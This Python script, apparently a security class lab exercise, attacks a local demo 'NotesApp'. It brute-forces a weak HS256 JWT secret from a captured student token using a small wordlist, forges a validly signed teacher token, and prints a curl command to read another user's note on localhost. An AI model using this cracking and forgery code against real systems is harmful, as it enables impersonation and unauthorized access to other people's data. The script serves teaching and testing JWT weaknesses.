"""
Class 6 Part 2 - "crack the seal".

The server now rejects alg:none and demands a valid HS256 signature.
But NotesApp's JWT_SECRET defaults to the weak value "s3cr3t" (see
docker-compose.yml / app.py). We recover it with a small wordlist, then
mint a VALID, properly-signed teacher token - no server access needed,
the crack is 100% offline against one captured token.
"""
import json, base64, hmac, hashlib

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def make_jwt(payload: dict, secret: str, alg: str = "HS256") -> str:
    header = {"alg": alg, "typ": "JWT"}
    hb = b64url(json.dumps(header).encode())
    pb = b64url(json.dumps(payload).encode())
    sig = b64url(hmac.new(secret.encode(), f"{hb}.{pb}".encode(), hashlib.sha256).digest())
    return f"{hb}.{pb}.{sig}"

# --- a captured student token (what you'd copy from alice's session) ---------
# Reproduced here the way NotesApp signs it, so the crack is self-contained.
# Replace `captured` with a real token from the app if you want.
captured = make_jwt({"user_id": 6, "username": "alice", "role": "student"}, "s3cr3t")
print("captured alice token:\n ", captured, "\n")

# --- attacker: brute-force the signing secret from the captured token --------
wordlist = [
    "password", "123456", "admin", "secret", "letmein", "root", "toor",
    "notesapp", "changeme", "qwerty", "dev", "test", "jwt", "s3cr3t",
    "secret123", "password1", "flask", "key",
]
hb, pb, sig = captured.split(".")
signing_input = f"{hb}.{pb}".encode()

found = None
for w in wordlist:
    cand = b64url(hmac.new(w.encode(), signing_input, hashlib.sha256).digest())
    if hmac.compare_digest(cand, sig):
        found = w
        break

if not found:
    print("secret not in wordlist"); raise SystemExit(1)
print(f"CRACKED - the secret is: '{found}'\n")

# --- forge a VALID, signed teacher token (prof.turing, user_id 2) ------------
# prof.turing teaches class 1; note id 3 (bob, Math) belongs to that class.
forged = make_jwt({"user_id": 2, "username": "prof.turing", "role": "teacher"}, found)
print("Forged VALID teacher wristband (HS256, real signature):")
print(" ", forged, "\n")
print("Test it (should be 200 even though alg:none is now 401):")
print(f'  curl.exe -H "Authorization: Bearer {forged}" http://localhost:8080/api/notes/3')
